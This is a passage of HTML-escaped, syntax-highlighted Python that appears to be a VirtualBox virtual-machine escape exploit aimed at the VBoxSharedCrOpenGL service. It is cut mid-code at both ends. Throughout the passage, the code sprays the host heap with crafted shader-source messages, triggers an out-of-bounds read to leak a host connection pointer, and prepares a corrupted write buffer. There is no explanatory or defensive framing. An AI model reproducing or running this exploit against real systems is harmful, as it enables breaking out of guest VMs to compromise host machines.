              &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;I&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CR_SHADERSOURCE_EXTEND_OPCODE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; \
              &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;IIIII&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;A&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x260&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
        &lt;span class=&quot;n&quot;&gt;msg4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;make_oob_read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x570&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;msg4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;A&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x290&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;bufs&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;bufs2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;bufs3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x4000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;bufs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;alloc_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;bufs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;alloc_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;msg2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;50&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;bufs2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;alloc_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;bufs3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;alloc_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;msg3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;alloc_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;msg3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        
    
        &lt;span class=&quot;n&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hgcm_call&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SHCRGL_GUEST_FN_WRITE_READ_BUFFERED&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bufs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;A&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x50&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x50&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
        &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write_buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0a0a0000&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bufs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
        &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write_buf_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0a0135&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;50&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hgcm_call&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SHCRGL_GUEST_FN_WRITE_READ_BUFFERED&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bufs3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;A&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x50&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x50&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;setup&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;#self.leak_stuff()&lt;/span&gt;
        &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setup_write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;client&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;50&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;new_client&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hgcm_connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;VBoxSharedCrOpenGL&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;set_version&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new_client&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;client&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new_client&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;pay&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;B&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;pay2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&#39;C&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hgcm_call&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;13&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,[&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write_buf_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x420&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pay&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;leak&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hgcm_call&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SHCRGL_GUEST_FN_WRITE_READ_BUFFERED&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,[&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x42424242&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;A&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x290&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x290&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; 
        &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pConn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;unpack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;Q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;leak&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
        &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pConn&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pConn&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xe10&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x870&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;[*] Leaked conn @ 0x&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%016x&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pConn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        
        &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hgcm_call&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;13&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,[&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write_buf_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xdf0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x160&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pay2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hgcm_call&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;13&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,[&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write_buf_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xe30&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x160&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;I&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x15c8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)])&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;leak2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hgcm_call&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SHCRGL_GUEST_FN_WRITE_READ_BUFFERED&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,[&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x43434343&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;A&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x290&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x290&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
